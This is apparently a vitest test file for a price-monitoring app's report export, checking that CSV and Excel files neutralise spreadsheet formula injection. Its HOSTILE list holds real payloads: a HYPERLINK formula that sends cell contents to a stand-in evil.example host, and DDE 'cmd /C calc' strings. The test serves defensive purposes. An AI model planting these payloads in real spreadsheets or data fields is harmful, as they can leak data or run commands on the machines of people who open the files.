import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import ExcelJS from 'exceljs';
import { eq, inArray, and } from 'drizzle-orm';
import { offers, products, variants } from '@ci/database';
import { CSV_DATASETS, csvSafe, exportReport, generateReport, runMatching, startScan } from '@ci/services';
import { createHarness, type Harness, type Tenant } from '../support/harness.ts';

/**
 * Every product name, offer text and website name in a report was written by a stranger on somebody else's website. A cell that starts with
 * "=", "+", "-", "@", a tab or a carriage return can run as a formula when the file is opened in a spreadsheet. None may.
 */
const HOSTILE = [
  '=HYPERLINK("http://evil.example/?d="&A1,"Click for the price")',
  "+cmd|' /C calc'!A0",
  '-2+3+cmd|\' /C calc\'!A0',
  '@SUM(1+1)*cmd|\' /C calc\'!A0',
  '\t=1+1',
  '\r=1+1',
  '=1+1, with "quotes" and\na line break',
];

let h: Harness;
let t: Tenant;
let reportId: string;
const db = () => h.db.worker;

/** A small RFC 4180 reader: quoted cells, doubled quotes, line breaks inside quotes. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  const s = text.charCodeAt(0) === 0xfeff ? text.slice(1) : text; // drop the byte-order mark Excel needs at the start of a UTF-8 CSV
  for (let i = 0; i < s.length; i++) {
    const ch = s[i]!;
    if (quoted) {
      if (ch === '"' && s[i + 1] === '"') { cell += '"'; i++; } else if (ch === '"') quoted = false; else cell += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ',') { row.push(cell); cell = ''; } else if (ch === '\r' && s[i + 1] === '\n') { row.push(cell); rows.push(row); row = []; cell = ''; i++; } else cell += ch;
  }
  if (cell || row.length) { row.push(cell); rows.push(row); }
  return rows;
}
const isPlainNumber = (c: string) => /^-?\d+(\.\d+)?$/.test(c);

beforeAll(async () => {
  h = await createHarness();
  t = await h.newTenant('ExportSafety');
  const source = await t.addFixtureSite('source', 'source');
  const woo = await t.addFixtureSite('woo', 'competitor');
  for (const id of [source, woo]) await t.tx((tx) => startScan(h.svc, tx, t.orgId, id, { kind: 'discovery', trigger: 'manual' }));
  await h.queue.drain();
  await runMatching(h.svc, db(), t.orgId);
  // the strangers' texts arrive in the product names and the offer texts
  const mine = await db().select({ id: products.id }).from(products).where(eq(products.siteId, source));
  for (let i = 0; i < HOSTILE.length; i++) await db().update(products).set({ title: HOSTILE[i]! }).where(eq(products.id, mine[i]!.id));
  const rival = await db().select({ id: products.id }).from(products).where(eq(products.siteId, woo));
  await db().update(products).set({ title: HOSTILE[0]! }).where(inArray(products.id, rival.slice(-3).map((r) => r.id)));
  const sale = await db().select({ id: offers.id }).from(offers).where(and(eq(offers.orgId, t.orgId), eq(offers.kind, 'sale_price'))).limit(2);
  for (const o of sale) await db().update(offers).set({ title: HOSTILE[1]! }).where(eq(offers.id, o.id));
  await db().update(variants).set({ sku: HOSTILE[3]! }).where(eq(variants.siteId, source));
  const report = await generateReport(h.svc, db(), t.orgId, { kind: 'manual', deadlineAt: null, createdBy: t.userId });
  reportId = report.id;
}, 180_000);

afterAll(async () => {
  await h.close();
});

describe('csvSafe', () => {
  it.each(HOSTILE)('neutralises %j', (v) => {
    const out = csvSafe(v);
    const first = out.startsWith('"') ? out.slice(1) : out;
    expect(first.startsWith("'"), out).toBe(true);
  });
  it('leaves ordinary text, empty values and real numbers (including negative ones) alone', () => {
    expect(csvSafe('Absolut Vodka 1L')).toBe('Absolut Vodka 1L');
    expect(csvSafe(null)).toBe('');
    expect(csvSafe(-4.25)).toBe('-4.25');
    expect(csvSafe(12.5)).toBe('12.5');
    expect(csvSafe('a, b')).toBe('"a, b"');
    expect(csvSafe('say "hi"')).toBe('"say ""hi"""');
  });
});

describe('exported files', () => {
  it.each([...CSV_DATASETS])('CSV "%s": no cell can start a formula, and the hostile text is kept readable', async (dataset) => {
    const { body } = await exportReport(h.svc, db(), t.orgId, reportId, 'csv', dataset);
    const rows = parseCsv(body.toString('utf8')).slice(1); // the first line is a "# …" caption
    expect(rows.length).toBeGreaterThan(1);
    for (const row of rows) {
      for (const cell of row) {
        if (/^[=+\-@\t\r]/.test(cell)) expect(isPlainNumber(cell), `formula-capable cell in ${dataset}: ${JSON.stringify(cell)}`).toBe(true);
      }
    }
    if (dataset === 'comparison') {
      const text = body.toString('utf8');
      expect(text).toContain(`'=HYPERLINK(`); // visible, not executable
    }
  });

  it('Excel: nothing is stored as a formula; hostile texts are plain strings', async () => {
    const { body } = await exportReport(h.svc, db(), t.orgId, reportId, 'xlsx');
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(body as never);
    let seenHostile = 0;
    let cells = 0;
    wb.eachSheet((ws) => ws.eachRow((row) => row.eachCell((cell) => {
      cells++;
      expect(cell.type, `${ws.name}!${cell.address}`).not.toBe(ExcelJS.ValueType.Formula);
      expect((cell as unknown as { formula?: string }).formula, `${ws.name}!${cell.address}`).toBeUndefined();
      if (typeof cell.value === 'string' && /^[=+@]/.test(cell.value)) seenHostile++;
    })));
    expect(cells).toBeGreaterThan(50);
    // the hostile text is present as TEXT (string cells never calculate), so it can be read in the file
    expect(seenHostile).toBeGreaterThan(0);
  });
});
